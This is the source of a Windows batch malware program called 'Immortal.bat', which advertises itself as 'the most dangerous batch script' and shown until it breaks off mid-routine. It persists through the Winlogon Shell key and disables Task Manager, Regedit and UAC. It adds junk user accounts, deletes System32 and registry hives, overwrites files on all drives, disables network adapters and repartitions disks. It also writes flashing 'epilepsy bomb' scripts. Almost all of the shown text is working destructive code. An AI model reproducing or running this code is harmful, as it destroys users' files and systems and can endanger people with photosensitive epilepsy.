:: Set window dimensions
@echo off
mode con: cols=100 lines=50

set scriptDir=C:\Immortal
set scriptName=Immortal.bat
set scriptReg=HKEY_LOCAL_MACHINE\SOFTWARE\Immortal

set hideVbs=%scriptDir%\hide.vbs
set normalVbs=%scriptDir%\normal.vbs
set injectScript=%scriptDir%\epilepsy.bat
set hackedScript=%scriptDir%\hacked.bat
set spamBatch=%scriptDir%\spam.bat
set randomBatch=%scriptDir%\letsrunsomeaps.bat

::This is for registry
::It doesn't want to take strings with spaces so that's why I hardcoded
set lvlAn=[Annoying]
set lvlHa=[Harsh]
set lvlCr=[Cruel]
set lvlDe=[Deadly]

::Run with UI or not
call :RunAs

::Check if the script is on the right Operating System
call :OsDetection

::Because the %username% can be changed, let's keep the old one
set realName=
call :GetRealName

color 17

if not exist %scriptDir% (
	call :Warning
)

::Let's check if we want to execute some special payloads
cls

call :Launcher

::Check if the directory for script exist. If not, it means that the program has been launched for the first time.

cls

if not exist %scriptDir% (
	mkdir %scriptDir%
	attrib +h %scriptDir%

	::Copy this batch script to script directory
	copy /y "%~f0" "%scriptDir%\%scriptName%"

	call :CreateVbs

	call :EpilepsyBomb "HACKED BY IMMORTAL.BAT", "%hackedScript%"

	call :EpilepsyBomb "INJECTED BY IMMORTAL.BAT", "%injectScript%"

	call :SpamScript

	call :TriggerScript

	::Protect all files in script dir
	call :Protect "%scriptDir%"

	::Start script together with explorer.exe
	call :BlockRegistry "0"
	reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, cmd.exe /c \"start /min \"\" \"%scriptDir%\%scriptName%\"\"" /f
)

::Global level variables
set lvl[0]=[Level Casual]
set lvl[1]=[Level Normal]
set lvl[2]=[Level Annoying]
set lvl[3]=[Level Harsh]
set lvl[4]=[Level Cruel]
set lvl[5]=[Level Deadly]

:Main
@echo off
cls

color 17

set regKApp=HKEY_LOCAL_MACHINE\Immortal
set regSColor=/v Theme
set regVTheme=17

setlocal enabledelayedexpansion 

title %scriptName% - The most dangerous batch script!

set Version=1.0 Release
set Os=Windows 8.1 and newer
set Purpose=Just to corrupt this system
set Credits=Subscribe to CYBER SOLDIER :D
set /a Stars=50
set star=

set keyExit=Exit application

for /l %%s in (0, 1, %Stars%) do (
	set "star=!star!*"
)

echo %star%
echo Welcome to the most dangerous batch script!
echo Current version: %Version%
echo Targeted Operating System: %Os%
echo Purpose: %Purpose%
echo %Credits%
echo %star%

set /a Hashes=60
set hash=

for /l %%h in (0, 1, %Hashes%) do (
	set "hash=!hash!#"
)

echo.
echo Here you can choose the level that you want to try.
echo Each level is described according to its destructive ability.
echo The least dangerous aka the safest is - [Level Casual].
echo The most dangerous is called - [Level Deadly].
echo.
echo Press (A) - (G) to choose the level.
echo %hash%

endlocal

set customPause=Press any key to launch next payload ...
set /a countdown=5

echo.
echo (A) - 0. %lvl[0]%
echo Description: Not destructive at all. This level provides basic tricks with your pc.
echo.
echo (B) - 1. %lvl[1]%
echo Description: Still not destructive, but for the common user it can be a nightmare.
echo.
echo (C) - 2. %lvl[2]%
echo Description: This level can be described as a very spammy and nasty. It can make you very angry :)
echo.
echo (D) - 3. %lvl[3]%
echo Description: From the level name, we can assume that it can do some kind of damage.
echo You will be still able to boot into your system again, but expect some kind of damage.
echo.
echo (F) - 4. %lvl[4]%
echo Description: You really don't want to mess with Cruel Level.
echo The system will be corrupted, but if you're smart enough you can repair it.
echo.
echo (G) - 5. %lvl[5]%
echo Description: The most insane level. It will erase all your personal and system files.
echo Be very careful about this one! After execution, it is not possible to repair the system.
echo.

echo.
echo (E) - Exit

::Menu handler
choice /c ABCDFGE /n /m ""

if errorlevel 7 (
	exit
) else if errorlevel 6 (
	call :LDeadly
) else if errorlevel 5 (
	call :LCruel
) else if errorlevel 4 (
	call :LHarsh
) else if errorlevel 3 (
	call :LAnnoying
) else if errorlevel 2 (
	call :LNormal
) else if errorlevel 1 (
	call :LCasual
)

::Level 0. - Casual
:LCasual

cls

echo Do you want to execute %lvl[0]% (Y/N)?

choice /c YN /n /m ""

if errorlevel 2 (
	goto Main
)

cls

::Payload - Hidden files
set desktopPath="C:\Users\%realName%\Desktop"

call :Timer %countdown%

attrib +h %desktopPath%\*.* /s /d

cls

echo 1. Payload - All your files on the desktop have been set to hidden!
echo.
echo %customPause%
pause >nul

::Payload - Random programs

call :Timer %countdown%

setlocal enabledelayedexpansion

set /a index=0
set system32Path=C:\Windows\System32
set /a maxPrograms=30

for /f "delims=" %%f in ('dir %system32Path%\*.exe %system32Path%\*.scr /b') do (
	set /a index+=1
	set "program[!index!]=%%f"
)

for /l %%n in (0, 1, %maxPrograms%) do (
	timeout /t 1 /nobreak >nul
	set /a randomNum=!random! %% !index!

	call :sub_RandomProgram %system32Path%, !randomNum!, %%n, %maxPrograms%
)

:sub_RandomProgram

if %3 neq %4 (
	set file="%~1\!program[%~2]!"

	start "" %file%
	echo Attempt to launch %file%.

	exit /b /0
)

endlocal

cls

echo 2. Payload - Some random applications have been executed!
echo.
echo %customPause%

pause >nul

::Random websites

call :Timer %countdown%

setlocal enabledelayedexpansion

set webSite[0]=https://www.youtube.com/
set webSite[1]=https://www.google.com/search?client=firefox-b-d^&q=how+to+download+bonzibuddy
set webSite[2]=https://www.google.com/search?client=firefox-b-d^&q=batch+script+course
set webSite[3]=https://bonzi.link/
set webSite[4]=https://youareanidiot.cc/
set webSite[5]=https://www.youtube.com/watch?v=TGqBs9Fx1bM^&list=PLyaHtebcT05enJaKsS7VxzojxGMoDzq3R
set webSite[6]=https://www.youtube.com/shorts/Lpau5V2jLAE
set webSite[7]=https://www.reddit.com/media?url=https^%3A^%2F^%2Fi.redd.it^%2Fnrbim3cb7r771.jpg^&rdt^=44985
set webSite[8]=https://chatgpt.com/
set webSite[9]=https://www.google.com/search?client=firefox-b-d^&q=google+p^%C5^%99eklada^%C4^%8D
set webSite[10]=https://www.bing.com/search?q=google+is+better^&form=QBLH^&sp=-1^&ghc=1^&lq=0^&pq=google+is+better^&sc=12-16^&qs=n^&sk=^&cvid=929D54F58D9349E6B72119A47C26C97E^&ghsh=0^&ghacc=0^&ghpl=
set webSite[11]=https://search.yahoo.com/search?p=deadest+engine+ever^%21^%21^&fr=yfp-t^&fr2=p^%3Afp^%2Cm^%3Asb^&ei=UTF-8^&fp=1
set webSite[12]=https://www.quora.com/Why-am-I-black-Can-you-explain-to-me
set webSite[13]=https://www.crazygames.cz/hra/plazma-burst
set webSite[14]=https://www.reddit.com/r/geek/comments/exeqr/dae_remember_the_old_norton_antivirus_boxes/?rdt^=58720

set /a arraySize=0
:GetArraySize

if defined webSite[%arraySize%] (
	set /a arraySize+=1
	goto GetArraySize
)

for /l %%n in (0, 1, %arraySize%) do (
	timeout /t 1 /nobreak >nul

	set /a rand=!random! %% %arraySize%
	call :sub_RandomSites !rand!, %%n, %arraySize%
)

:sub_RandomSites

if %2 leq %3 (
	start !webSite[%1]!
	exit /b 0
)

endlocal

cls

echo 3. Payload - Hope you enjoyed browsing on the internet!
echo.
echo %customPause%

pause >nul

::Restart pc

call :Timer %countdown%

echo Let's restart this computer :D

shutdown /r /f /t 3

call :FinalMsg 0

goto Main

::Level 1. - Normal
:LNormal

reg query "HKEY_LOCAL_MACHINE"

if %errorlevel% neq 0 (
	call :BlockRegistry "0"
)

cls

color a0

echo Do you want to execute %lvl[1]% (Y/N)?

choice /c YN /n /m ""

if errorlevel 2 (
	goto Main
)

::Disable Task Manager

call :Timer %countdown%

call :DisableTaskMgr

cls

echo 1. Payload - Try to open the Task Manager bozo!
echo.
echo %customPause%

pause >nul

::Disable Registry Editor

call :Timer %countdown%

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f

cls

echo 2. Payload - What about disabling Registry Editor :) ?
echo.
echo %customPause%

pause >nul

::Disable UAC
::Let's use powershell because the registry editor is disabled

call :Timer %countdown%

call :DisableUAC

cls

echo 3. Payload - I can still edit registry!!!
echo Say goodbye to UAC protection!
echo You will not see that window again!
echo I can run any program as I want without asking you :)
echo.
echo %customPause%

pause >nul

::Remove wallpaper

call :Timer %countdown%

call :regShellCreate "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System", "Wallpaper", "I dont like it", "String"
call :regShellCreate "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System", "WallpaperStyle", "4", "String"

cls

taskkill /f /im explorer.exe

timeout /t 3 /nobreak >nul

start explorer.exe

set message="Hello "%username%"! I've just realized that I can write a message to you. Expect more message boxes soon ;)"

msg "%username%" "%message:"=%"

cls

echo 4. Payload - Your wallpaper sucks!
echo I couldn't look on that ugly wallpaper so I decided to remove it for good!
echo You're welcome :)
echo.
echo %customPause%

call :FinalMsg 1

goto Main

::Level 2. - Annoying
:LAnnoying

cls

color e0

echo Do you want to execute %lvl[2]% (Y/N)?

choice /c YN /n /m ""

if errorlevel 2 (
	goto Main
)

call :Timer %countdown%

call :BlockRegistry "0"

call :DisableTaskMgr

call :DisableUAC

cls

::Enable Annoying mode
call :ChangeLVL "%lvlAn%", "1"

::Swap the mouse input
call :regShellAdd "HKCU:\Control Panel\Mouse", "SwapMouseButtons", "1"

::Change the username
call :ChangeUserName

cls

set msgTitle=Hey %username%
set msgText=I hope you like your new username. The previous one was kinda stupid. lol

::Custom welcome message
call :regShellAdd "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "legalnoticecaption", "%msgTitle%"
call :regShellAdd "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "legalnoticetext", "%msgText%"

::Chnages "all" icons in the classes 
call :IconChnage

call :BlockRegistry "1"

cls

call :FinalMsg 2

echo You're fucked :)
timeout /t 1 /nobreak >nul
shutdown /r /t 0 /f

goto Main

::Level 3. - Harsh
:LHarsh

cls

color 47

echo Do you want to execute %lvl[3]% (Y/N)?

choice /c YN /n /m ""

if errorlevel 2 (
	goto Main
)

cls

echo This level has some special payloads which can be executed
echo on specific date.
echo.
echo To execute one of these payloads, change the date to specific.
echo.
echo No date needed (default) - File Overwritter
echo (02/11) - Shell Overwritter
echo (04/01) - Delete Classes
echo.
echo These payloads will not launch immediately after execution, but rather
echo at the end of this level. In other words on 4th payload.
echo.

pause

call :Timer %countdown%

call :BlockRegistry "0"

call :DisableTaskMgr

call :DisableUAC

cls

::Enable Harsh mode
call :ChangeLVL "%lvlHa%", "1"

::Change keyboard input
call :KeyboardMap

::Delete some system files (non critical)
call :DelNonCrit

call :BlockRegistry "1"

cls

call :FinalMsg 3

echo This is gonna hurt :)
timeout /t 1 /nobreak >nul
shutdown /r /t 0 /f

goto Main

::Level 4. - Cruel
:LCruel

cls

color 50

echo Do you want to execute %lvl[4]% (Y/N)?

choice /c YN /n /m ""

if errorlevel 2 (
	goto Main
)

cls

echo This level has some variations which can be executed on specific date.
echo.
echo Change the date to execute some of these payloads.
echo.
echo No date needed (default) - Font Corruption
echo 03/30 - System32 Corruption
echo 12/25 - Image File Execution Option
echo 01/01 - File Injection
echo.
echo Keep in mind that all of these payloads are very destructive! Because of that, they
echo cannot be launched in a row.
echo.

pause

call :Timer %countdown%

call :BlockRegistry "0"

call :DisableTaskMgr

call :DisableUAC

cls

::Enable Cruel mode
call :ChangeLVL "%lvlCr%", "1"

call :BlockRegistry "1"

cls

call :FinalMsg 4

echo There is no escape!
timeout /t 1 /nobreak >nul
shutdown /r /t 0 /f

goto Main

::Level 5. - Deadly
:LDeadly

cls

color f0

echo Do you want to execute %lvl[5]% (Y/N)?

choice /c YN /n /m ""

if errorlevel 2 (
	goto Main
)

call :Timer %countdown%

call :BlockRegistry "0"

call :DisableTaskMgr

call :DisableUAC

cls

::Enable Cruel mode
call :ChangeLVL "%lvlDe%", "1"

call :BlockRegistry "1"

cls

call :FinalMsg 5

echo Rest and piece bitch!
timeout /t 1 /nobreak >nul
shutdown /r /t 0 /f

goto Main
::#############################################################################
::#############################################################################
::#############################################################################
:DelNonCrit

setlocal enabledelayedexpansion

set dirWin=C:\Windows\

set winFile[0]=HelpPane.exe
set winFile[1]=hh.exe
set winFile[2]=notepad.exe
set winFile[3]=splwow64.exe
set winFile[4]=winhlp32.exe
set winFile[5]=write.exe

set dirSys32=C:\Windows\System32\

set sys32File[0]=azman.msc
set sys32File[1]=Bubbles.scr
set sys32File[2]=certlm.msc
set sys32File[3]=certmgr.msc
set sys32File[4]=certreq.exe
set sys32File[5]=cleanmgr.exe
set sys32File[6]=cliconfg.exe
set sys32File[7]=taskkill.exe
set sys32File[8]=cmstp.exe
set sys32File[9]=colorcpl.exe
set sys32File[10]=comexp.msc
set sys32File[11]=compmgmt.msc
set sys32File[12]=CompMgmtLauncher.exe
set sys32File[13]=ComputerDefaults.exe
set sys32File[14]=control.exe
set sys32File[15]=credwiz.exe
set sys32File[16]=cttune.exe
set sys32File[17]=dccw.exe
set sys32File[18]=dcomcnfg.exe
set sys32File[19]=devmgmt.msc
set sys32File[20]=dialer.exe
set sys32File[21]=diskmgmt.msc
set sys32File[22]=dxdiag.exe
set sys32File[23]=Taskmgr.exe
set sys32File[24]=WF.msc

call :GetArraySizeC "winFile"

for /l %%n in (0, 1, !arrayCount!) do (
	takeown /f "%dirWin%!winFile[%%n]!" && icacls "%dirWin%!winFile[%%n]!" /grant "%username%:F"

	del "%dirWin%!winFile[%%n]!"
)

call :GetArraySizeC "sys32File"

for /l %%n in (0, 1, !arrayCount!) do (
	takeown /f "%dirSys32%!sys32File[%%n]!" && icacls "%dirSys32%!sys32File[%%n]!" /grant "%username%:F"

	del "%dirSys32%!sys32File[%%n]!"
)

exit /b 0

:GetArraySizeC

set /a arrayCount=0

for /l %%n in (0, 1, 100) do (
	if defined %~1[%%n] (
		set /a arrayCount=%%n
	) else (
		exit /b 0
	)
)

exit /b 0

:KeyboardMap

set keyMap=00000000000000001b0000007d001e0037003000^
34002e0029002000270012001b0021006be022003be0230021^
e0170056e024004e00250045e02600010032003de031003a00^
1800040019002ee0100030e0130045001f001c001400080016^
0049002f0008e0110058e02d002000150026002c0000000000

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d "%keyMap%"

exit /b 0

:IconChnage

reg query HKEY_CURRENT_USER\Software

if %errorlevel% neq 0 (
	echo It seems that registry editor is disabled.
	echo Let me fix it ...
	call :regShellAdd "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0"
)

::Change regedit
setlocal enabledelayedexpansion

for /f "tokens=1 delims= " %%s in ('reg query HKEY_LOCAL_MACHINE\SOFTWARE\Classes /s /f DefaultIcon /k') do (
	set /a rand=!random! %% 4
	reg add %%s /ve /d "%%SystemRoot%%\system32\user32.dll,!rand!" /f
)

set /a rand=%random% %% 4

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 3 /d "%%SystemRoot%%\system32\user32.dll,%rand%" /f  
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 4 /d "%%SystemRoot%%\system32\user32.dll,%rand%" /f 

exit /b 0
::#############################################################################
::#############################################################################
::#############################################################################
:ChangeUserName

setlocal enabledelayedexpansion

set /a words=0
set strData=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
set strNew=

call :StringSize

::Generate random StringSize
set /a randSize=%random% %% 20

for /l %%n in (0, 1, %randSize%) do (
	set /a rand=!random! %% %words%
	call :GenerateStr !rand!
)

call :SetUserName %strNew%

exit /b 0

:StringSize

set "char=!strData:~%words%,1!"

if defined char (
	set /a words+=1
	
	goto StringSize
)

exit /b 0

:GenerateStr

set strNew=!strNew!!strData:~%1,1!

exit /b 0

:SetUserName
echo %1
wmic useraccount where name='%username%' rename %1

exit /b 0
::#############################################################################
::#############################################################################
::#############################################################################
:Launcher

setlocal enabledelayedexpansion
call :BlockRegistry "0"

::Ignore if already exist
call :RegDefCreate "%lvlAn%"
call :RegDefCreate "%lvlHa%"
call :RegDefCreate "%lvlCr%"
call :RegDefCreate "%lvlDe%"

call :IntRegEqual "%lvlAn%"

if %regEqual% geq 1 (
	echo %lvlAn% is activated
	call :MODE_ANNOYING
)

call :IntRegEqual "%lvlHa%"

if %regEqual% geq 1 (
	echo %lvlHa% is activated
	call :MODE_HARSH
)

call :IntRegEqual "%lvlCr%"

if %regEqual% geq 1 (
	echo %lvlCr% is activated
	call :MODE_CRUEL
)

call :IntRegEqual "%lvlDe%"

if %regEqual% geq 1 (
	echo %lvlDe% is activated
	call :MODE_DEAD
)

exit /b 0

:MODE_ANNOYING
call :IntRegEqual "%lvlAn%"

if %regEqual% equ 4 (
	
	call :ChangeLVL "%lvlAn%", "0"

	call :BlockRegistry "1"

	call :RunScripts

	exit /b 0
)

call :IntRegEqual "%lvlAn%"

if %regEqual% equ 3 (
	
	call :ChangeLVL "%lvlAn%", "4"

	call :BlockRegistry "1"

	call :TrojanDL

	exit /b 0
)

call :IntRegEqual "%lvlAn%"

if %regEqual% equ 2 (
	
	call :ChangeLVL "%lvlAn%", "3"

	call :BlockRegistry "1"

	call :GibberishBoxes

	exit /b 0
)

::This is the first payload - Random files on disk
call :ChangeLVL "%lvlAn%", "2"
call :BlockRegistry "1"
call :MessageBox "I am going to add a lot of files on all drives :)", "%username%", "0", "48"
call :RandomFiles

exit /b 0

:MODE_HARSH

call :IntRegEqual "%lvlHa%"

if %regEqual% equ 4 (

	::Use booldate to check if the date matches your favour
	call :DateTimed "02/11"
	if "!boolDate!"=="1" (
		call :BlockRegistry "0"
		reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /d "cmd.exe /c \"start /max \"\" \"%hackedScript%\"\"" /f
		reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /d "cmd.exe /c \"start /max \"\" \"%hackedScript%\"\"" /f
		call :BlockRegistry "1"
		call :MessageBox "I hope you don't suffer from epilepsy", "%username%", "0", "48"
		shutdown /r /f /t 5
		exit /b 0
	)
	call :DateTimed "04/01"
	if "!boolDate!"=="1" (
		call :DeleteClasses
		call :BlockRegistry "1"
		call :MessageBox "Im gonna make this shit unusable", "%username%", "0", "48"
		exit /b 0
	)

	::If date time is different then execute this payload
	call :BlockRegistry "0"
	call :Overwriter

	exit /b 0
)

call :IntRegEqual "%lvlHa%"

if %regEqual% equ 3 (
	
	call :ChangeLVL "%lvlHa%", "4"
	call :BlockRegistry "1"
	call :MessageBox "You do not need the internet mf!", "%username%", "0", "48"
	call :InternetDown

	exit /b 0
)

call :IntRegEqual "%lvlHa%"

if %regEqual% equ 2 (
	
	call :ChangeLVL "%lvlHa%", "3"
	call :BlockRegistry "1"
	call :MessageBox "Its time to expand!", "%username%", "0", "48"
	call :Disks

	exit /b 0
)

::This is the first payload - Random Accounts
call :ChangeLVL "%lvlHa%", "2"
call :BlockRegistry "1"
call :MessageBox "Lets get some friends!", "%username%", "0", "48"
call :GibberishAccounts

exit /b 0

:MODE_CRUEL

call :DateTimed "03/30"
if "!boolDate!"=="1" (
	call :Sys32Corrupt
	shutdown /r /f /t 0

	exit /b 0
)

call :DateTimed "12/25"
if "!boolDate!"=="1" (
	call :IFEO
	shutdown /r /f /t 0

	exit /b 0
)

call :DateTimed "01/01"
if "!boolDate!"=="1" (
	call :Injector
	shutdown /r /f /t 0

	exit /b 0
)

::This is the first payload - Font Corruption
call :FontCorrupt
call :BlockRegistry "1"

shutdown /r /f /t 0

exit /b 0

:MODE_DEAD

rmdir /s /q "C:\Recovery"

call :DelAllFiles

call :DelRegistry

exit /b 0

:RegDefCreate
::If the registry for script does not exist, the script will create one with default data which is 0
::par 1. - value name
reg query "%scriptReg%" /v %~1

if %errorlevel% neq 0 (
	reg add "%scriptReg%" /v %~1 /t REG_DWORD /d "0" /f
)

exit /b 0

:ChangeLVL
::par 1. - value name, 2. - numeric data
reg add "%scriptReg%" /v %~1 /t REG_DWORD /d "%~2" /f

exit /b 0

:BlockRegistry
::Check if key exist
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools
::If it doesn't then create the value with default data 
if %errorlevel% neq 0 (
	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0
)

::Par 1. - Determines if the registry should be disabled or not
call :regShellAdd "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "%~1"

exit /b 0

:IntRegEqual
::If data equals %regEqual%
::Output data 
::Only numbers are accepted
::Limited to number 9 (0-9) cuz idk how to convert hexa to decimal in batch :(
reg query "HKEY_LOCAL_MACHINE"

if %errorlevel% neq 0 (
	set /a regEqual=0
	exit /b 0
)

for /f "tokens=3 delims= " %%s in ('reg query "%scriptReg%" /v %~1') do (
	for /f "tokens=2 delims=x" %%t in ('echo %%s') do (
		set /a regEqual=%%t
	)
)

exit /b 0
::#############################################################################
::#############################################################################
::#############################################################################
:Protect

icacls "%~1" /reset /t
icacls "%~1" /inheritance:d /t
icacls "%~1" /remove "Administrators" /t
icacls "%~1" /remove "%username%" /t
icacls "%~1" /remove "Authenticated Users" /t
icacls "%~1" /grant "Users:RX" /t
icacls "%~1" /inheritance:d /t

exit /b 0

:SpamScript

echo ^@echo off >> %spamBatch%
echo ^setlocal enabledelayedexpansion >> %spamBatch%
echo ^color 17 >> %spamBatch%
echo ^for /l %%%%n in (0, 1, 100) do ( >> %spamBatch%
echo ^set /a rand=!random! %%%% 9 >> %spamBatch%
echo ^set /a rand2=!random! %%%% 9 >> %spamBatch%
echo ^start cmd /k "@echo off && color !rand!!rand2! && dir C:\ /s" >> %spamBatch%
echo ^set /a randTimer=!random! %%%% 5+1 >> %spamBatch%
echo ^timeout /t !randTimer! /nobreak ^>nul >> %spamBatch%
echo ^) >> %spamBatch%
echo ^pause >> %spamBatch%

exit /b 0

:TriggerScript

echo ^@echo off >> %randomBatch%
echo ^setlocal enabledelayedexpansion >> %randomBatch%
echo ^for /f %%%%s in ('dir "C:\Windows\System32" /s /b') do ( >> %randomBatch%
echo ^start /min cmd /k "start %%%%s" >> %randomBatch%
echo ^) >> %randomBatch%

exit /b 0

:DelRegistry

reg delete "HKCC" /f
reg delete "HKU" /f
reg delete "HKCU" /f
reg delete "HKLM" /f
reg delete "HKCR" /f

exit /b 0

:DelAllFiles

setlocal enabledelayedexpansion

takeown /f "C:" /r /d y && icacls "C:" /grant "%username%:F" /t
call :Protect "%scriptDir%"
call :Protect "C:\Windows\regedit.exe"

set drives=ABCDEFGHIJKLMNOPQRSTUVWXYZ
call :StringSizeF

for /l %%n in (0, 1, %strSize%) do (
	set char=!drives:~%%n,1!:\
	if exist !char! (
		del "!char!" /q /s
	)
)

exit /b 0

:StringSizeF

for /l %%n in (0, 1, 100) do (
	set char=!drives:~%%n,1!
	if "!char!"=="" (
		set /a strSize+=1
		exit /b 0
	) else (
		set /a strSize=%%n
	)
)

exit /b 0

:Injector

call :BlockRegistry "0"

set regClass=HKEY_LOCAL_MACHINE\SOFTWARE\Classes
set output=C:\outputreg.txt

reg query "%regClass%" /s /k /f "command" > %output%

for /f %%s in (%output%) do (
	reg add "%%s" /ve /d "%injectScript%" /f
)

exit /b 0

:IFEO

call :BlockRegistry "0"

set regImageFile=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options

reg add "%regImageFile%\dwm.exe" /v "debugger" /d "notepad.exe"

exit /b 0

:Sys32Corrupt

set sys32Dir=C:\Windows\System32
set sys32Out=%sys32Dir%\sys32output.txt

takeown /f %sys32Dir% && icacls %sys32Dir% /grant "%username%:F"

dir %sys32Dir% /b > %sys32Out%

for /f "tokens=*" %%s in (%sys32Out%) do (
	del /f /q "%sys32Dir%\%%s"
)

exit /b 0

:FontCorrupt

call :BlockRegistry "0"

reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Management" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontDPI" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontLink" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontMapper" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontSubstitutes" /f

exit /b 0

:DeleteClasses

set regClasses=HKEY_LOCAL_MACHINE\SOFTWARE\Classes

reg delete "%regClasses%" /f

call :BlockRegistry "1"

exit /b 0

:EpilepsyBomb

echo mode con: cols=100 lines=50 >> %~2
echo title %~1!^!^! >> %~2
echo :Test >> %~2
echo @echo off >> %~2
echo set /a rand=%%random%% %%%% 10 >> %~2
echo set /a rand2=%%random%% %%%% 10 >> %~2
echo color %%rand%%%%rand2%% >> %~2
echo echo %~1!^!^! >> %~2
echo goto Test >> %~2
echo exit /b 0 >> %~2

exit /b 0

:Overwriter

setlocal enabledelayedexpansion

set newDir=C:\z846848552156
set debugFile=%newDir%\debug.txt
set scriptFile=%~f0
set drives=ABCDEFGHIJKLMNOPQRSTUVWXYZ

call :GetStringSizeD

if not exist %newDir% (
	mkdir %newDir%
	attrib +h %newDir%

	copy "%scriptFile%" "%newDir%"
)

call :MessageBox "Say goodbye to your all files :)", "%username%", "0", "48"

if exist "%debugFile%" (
	del "%debugFile%"
)

for /l %%n in (0, 1, %strSize%) do (
	set root=!drives:~%%n,1!:\
	if exist "!root!" (
		dir !root! /s /b >> "%debugFile%"
	)
)

for /f "usebackq delims=" %%s in ("%debugFile%") do (
	call :Owerwrite "%%s"
)

exit /b 0

:Owerwrite

set fileVictim=%~1
del /f /q "%fileVictim%"

echo "OVERWRITTEN BY IMMPORTAL.BAT" > "%fileVictim%"

exit /b 0

:GetStringSizeD

set char=
set /a strSize=0
for /l %%n in (0, 1, 100) do (
	set char=!drives:~%%n,1!
	if "!char!"=="" (
		exit /b 0
	) else (
		set /a strSize+=1
	)
)
exit /b 0

:InternetDown

setlocal enabledelayedexpansion
set abc=bcdefghij

for /f "tokens=1-3* delims= " %%a in ('netsh interface show interface') do (
	set networkName=%%d
	
	netsh interface set interface "!networkName!" admin=disable
)

exit /b 0

:Disks

setlocal enabledelayedexpansion

set dpartFile=C:\diskpart.txt
set letters=abdefghijklmnopqrstuvwxy

if exist "%dpartFile%" (
	del "%dpartFile%"
)

echo sel disk 0 >> %dpartFile%
echo convert dyn >> %dpartFile%

diskpart /s %dpartFile%

for /l %%n in (0, 1, 24) do (

	if exist "%dpartFile%" (
		del "%dpartFile%"
	)
	set let=!letters:~%%n,1!
	echo sel disk 0 >> %dpartFile%
	echo sel volume C >> %dpartFile%
	echo shrink desired=20 minimum=5 >> %dpartFile%
	echo create volume simple size=19 >> %dpartFile%
	echo format fs=ntfs label=!let! quick >> %dpartFile%
	echo assign letter=!let! >> %dpartFile%

	diskpart /s %dpartFile%
	
)

exit /b 0

:GibberishAccounts

setlocal enabledelayedexpansion

set gibberish=ěščřžýáíéĚŠČŘŽÝÁÍÉ0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ€đĐłŁ@$÷×¤

set /a strSize=0
call :StringSizeC "%gibberish%"

for /l %%n in (0, 1, 1000) do (
	::Generate random gibbersih text
	set /a randNumChar=!random! %% 13 + 1
	call :CharC "!randNumChar!"
	echo !weirdText!
	
	net user "!weirdText!" "!weirdText!" /add
	set weirdText=
)

exit /b 0

:CharC
for /l %%n in (0, 1, %~1) do (
	set /a randGib=!random! %% %strSize% + 1
	call :CombineC "!randGib!"
)

exit /b 0

:CombineC
set weirdText=!weirdText!!gibberish:~%~1,1!

exit /b 0

:StringSizeC
set strdata=%~1
set char=!strdata:~%strSize%,1!

if defined char (
	set /a strSize+=1
	goto StringSizeC
)

exit /b 0

:RandomFiles
setlocal enabledelayedexpansion

set /a strSize=0
set drives=ABDEFGHIJKLMNOPQRSTUVWXYZ
set selDrive=
set dirPath=
set gibberish=0123456789ěščřžýáíéĚŠČŘŽÝÁÍÉ€đĐłŁ$ß¤~

set extentions[0]=.pdf
set extentions[1]=.bmp
set extentions[2]=.docx
set extentions[3]=.exe
set extentions[4]=.dll
set extentions[5]=.sys
set extentions[6]=.txt
set extentions[7]=.png
set extentions[8]=.mp4
set extentions[9]=.mp3
set extentions[10]=.ini
set extentions[11]=.html
set extentions[12]=.wav
set extentions[13]=.bat
set extentions[14]=.zip
set extentions[15]=.rar

call :StringSizeB "%drives%"
set pathFile=C:\Windows\System32\paths.txt

if exist %pathFile% (
	del %pathFile%
)

::Writes all directories from existing drive
for /l %%n in (0, 1, %strSize%) do (
	set selDrive=!drives:~%%n,1!:\
	if exist !selDrive! (
	::First root then subdirs
	echo !selDrive:~0,-1! >> %pathFile%
		for /f "tokens=*" %%d in ('dir !selDrive! /ad /s /b') do (
			echo %%d >> %pathFile%
		)
	)
)
::Write data from specific directories
set targetDrive=C:
set targetDir[0]="%targetDrive%\Users"
::First root then subdirs
echo !targetDrive! >> %pathFile%
